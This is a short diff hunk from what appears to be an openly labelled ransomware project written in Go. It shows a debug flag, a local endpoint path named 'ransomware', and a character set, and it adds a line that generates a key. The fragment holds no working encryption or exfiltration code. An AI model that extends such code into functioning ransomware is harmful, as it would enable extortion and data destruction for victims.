@@ -13,3 +13,5 @@ const Debug = true
 const endpoint = "127.0.0.1:6031/ransomware"
 
 const charset = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789!@#$%^&*()_-+={}[]:\";'\\<>,.?/`~"
+
+var Key = GenerateKey()
